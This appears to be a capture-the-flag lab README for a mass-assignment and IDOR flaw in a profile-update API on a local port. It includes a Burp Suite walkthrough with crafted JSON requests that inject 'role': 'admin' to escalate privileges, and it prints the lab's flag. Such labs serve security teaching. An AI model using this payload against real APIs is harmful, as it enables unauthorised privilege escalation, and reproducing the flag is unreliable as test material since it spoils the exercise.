# Scenario 17: Mass Assignment & Profile Overwrite IDOR

- **Port:** `8017`
- **Category:** Broken Object Level Authorization (IDOR) / Mass Assignment (BOPLA)
- **Difficulty:** Practitioner
- **Flag:** `CTF{m4ss_4ss1gnm3nt_pr0f1l3_0v3rwr1t3}`
- **Target URL:** `http://localhost:8017/profile`

---

## Lab Description
This lab contains a Broken Object Property-Level Authorization (BOPLA / Mass Assignment) and IDOR vulnerability in the user profile update API. 

You are logged in as standard user **Carlos Rivera (`user_id: 102`)**. The frontend settings form only exposes `full_name`, `phone`, and `bio`. However, the backend endpoint `POST /api/user/profile/update` directly binds all JSON properties to the user database record without filtering privileged fields.

To solve this lab, intercept the profile update request using **Burp Suite** (or Browser DevTools), inject hidden privileged attributes (`"role": "admin"` or `"is_vip": 1`), and access the **Executive Security Console** (`/admin/dashboard`) to retrieve the flag.

---

## Exploitation Walkthrough (Burp Suite Methodology)

### 1. Intercepting the Update Request
1. Open `http://localhost:8017/profile` in your browser with Burp Suite Proxy enabled.
2. In the profile form, modify your phone number or bio and click **Update Account Profile**.
3. In Burp Suite (`Proxy -> HTTP history` or `Intercept`), locate the request to:
   ```http
   POST /api/user/profile/update HTTP/1.1
   Host: localhost:8017
   Content-Type: application/json

   {
     "user_id": 102,
     "full_name": "Carlos Rivera",
     "phone": "+1-555-0142",
     "bio": "Security Analyst"
   }
   ```

### 2. Crafting the Mass Assignment & IDOR Payload
1. Send the request to **Burp Repeater** (`Ctrl + R`).
2. Add the privileged property `"role": "admin"` (or `"is_vip": 1`) to the JSON body:
   ```http
   POST /api/user/profile/update HTTP/1.1
   Host: localhost:8017
   Content-Type: application/json

   {
     "user_id": 102,
     "full_name": "Carlos Rivera (Admin)",
     "role": "admin",
     "is_vip": 1,
     "phone": "+1-555-0142",
     "bio": "Elevated Administrator"
   }
   ```
3. Click **Send**.
4. Observe the API response confirming the elevation:
   ```json
   {
     "success": true,
     "message": "Profile for user #102 (carlos) updated successfully.",
     "user": {
       "id": 102,
       "role": "admin",
       "is_vip": 1
     }
   }
   ```

### 3. Flag Capture
1. In your browser, navigate to the **Executive Security Console**:
   ```text
   http://localhost:8017/admin/dashboard
   ```
2. The server verifies your elevated `admin` role, updates the lab status to **SOLVED 🎉**, and displays the CTF flag:
   ```text
   CTF{m4ss_4ss1gnm3nt_pr0f1l3_0v3rwr1t3}
   ```
